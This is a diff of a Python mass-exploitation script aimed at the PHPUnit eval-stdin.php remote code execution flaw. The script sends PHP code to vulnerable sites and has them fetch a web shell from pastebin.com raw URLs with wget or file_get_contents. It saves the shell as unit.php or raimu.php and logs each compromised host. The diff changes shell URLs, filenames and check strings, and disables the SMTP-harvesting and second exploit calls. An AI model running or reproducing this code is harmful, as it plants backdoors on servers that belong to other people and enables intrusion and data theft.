@@ -22,16 +22,16 @@ def rce(url):
     for paths in no_list:
         try:
             cekos = '<?php echo php_uname("a"); ?>'
-            upshell = '<?php system("wget https://pastebin.com/raw/dFZmUgqN -O enak.php"); ?>'
+            upshell = '<?php system("wget https://pastebin.com/raw/DWAYZwk5 -O unit.php"); ?>'
             url = url.strip()
             cek = r.get(url+paths+'eval-stdin.php', data=cekos)
             if 'Linux' in cek.text:
                 print "[os] " + cek.text
                 open('new_phpunitvuln.txt', 'a').write(cek.text+'\n'+url+paths+'eval-stdin.php'+'\n')
                 r.get(url+paths+'eval-stdin.php', data=upshell)
-                cekshell = r.get(url+paths+'enak.php?ng0r0ng')
-                if 'Linux' in cekshell.text:
-                    print "[Shell Uploaded] " + url+paths+'enak.php?ng0r0ng'
+                cekshell = r.get(url+paths+'unit.php?ngacengan_su')
+                if 'IDBTE4M' in cekshell.text:
+                    print "[Shell Uploaded] " + url+paths+'unit.php?ngacengan_su'
                     open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'unit.php?ngacengan_su'+'\n')
                 else:
                     print "[Shell not Uploaded]   : " + cekshell
@@ -46,17 +46,17 @@ def rce2(url):
     for paths in no_list:
         try:
             cekos = '<?php echo php_uname("a"); ?>'
-            upshell = '<?php fwrite(fopen("ngentu.php","w+"),file_get_contents("https://pastebin.com/raw/dFZmUgqN")); ?>'
+            upshell = '<?php fwrite(fopen("raimu.php","w+"),file_get_contents("https://pastebin.com/raw/DWAYZwk5")); ?>'
             url = url.strip()
             cek = r.get(url+paths+'eval-stdin.php', data=cekos)
             if 'Linux' in cek.text:
                 print "[os] " + cek.text
                 open('new_phpunitvuln.txt', 'a').write(cek.text+'\n'+url+paths+'eval-stdin.php'+'\n')
                 r.get(url+paths+'eval-stdin.php', data=upshell)
-                cekshell = r.get(url+paths+'ngentu.php?ng0r0ng')
-                if 'Linux' in cekshell.text:
-                    print "[Shell Uploaded] " + url+paths+'ngentu.php?ng0r0ng'
-                    open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'ngentu.php?ng0r0ng'+'\n')
+                cekshell = r.get(url+paths+'raimu.php?ngacengan_su')
+                if 'IDBTE4M' in cekshell.text:
+                    print "[Shell Uploaded] " + url+paths+'raimu.php?ngacengan_su'
+                    open('new_shell_phpunit.txt', 'a').write(cek.text+'\n'+url+paths+'raimu.php?ngacengan_su'+'\n')
                 else:
                     print "[Shell not Uploaded]   : " + cekshell
             else:
@@ -342,9 +342,9 @@ def getsmtp(url):
 		pass
 def robot(url):
     try:
-        getsmtp(url)
+        #getsmtp(url)
         rce(url)
-        rce2(url)
+        #rce2(url)
     except:
 		pass
 		
